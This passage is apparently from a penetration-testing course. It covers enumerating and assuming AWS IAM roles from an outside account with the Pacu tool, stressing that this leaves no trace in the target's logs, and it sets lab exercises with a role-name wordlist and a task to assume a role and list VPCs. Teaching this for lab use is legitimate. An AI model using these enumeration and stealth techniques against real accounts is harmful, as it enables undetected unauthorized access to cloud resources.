Cleaning up the PacuIamEnumRoles-XbsIV role.
```

> Listing 46 - Running the enum_roles Module in pacu

Excellent! The tool not only helped enumerate and discover a role, it also checked if the role had enough permissions for us to use it via _assumeRole_.

We are now in the state of an _"Initial Compromise"_ and the next step will be scoping what we can achieve with our new level of access.

These examples show how an attacker can leverage the API to obtain information beyond their intended purpose. Furthermore, since these interactions with the API occur within the _attacker_'s account, all related events are logged there, leaving no trace in the target's account.

#### Labs

1. Enumerate other roles by creating a new list with the keywords: "saphire", "ruby", and "amethyst" following a dash and one of the custom name roles we created before. For example:

```
ruby-lab_admin
ruby-security_auditor
ruby-content_creator
...
amethyst-backup_restore
amethyst-content_editor
```

Write the name of the role we can assume.

Answer

2. Assume the role you found in the previous exercise and list (_describe_) all available _VPCs_ using the role privileges. You will find the proof in a tag of one of the VPCs.

Answer

## 4. Wrapping Up

Reconnaissance is an important stage that let us gather information from the target. By interacting with publicly available services and resources, we learn about the service provider and cloud resources the target uses.

We also explored some examples in AWS about how to abuse the public CSP API to gather information about the target from an external account.

Using the information from reconnaissance we can identify potential weaknesses in the target's infrastructure and services. This analysis allows us to tailor our attack vectors and devise social engineering tactics aimed at infiltrating the target's systems more effectively and efficiently.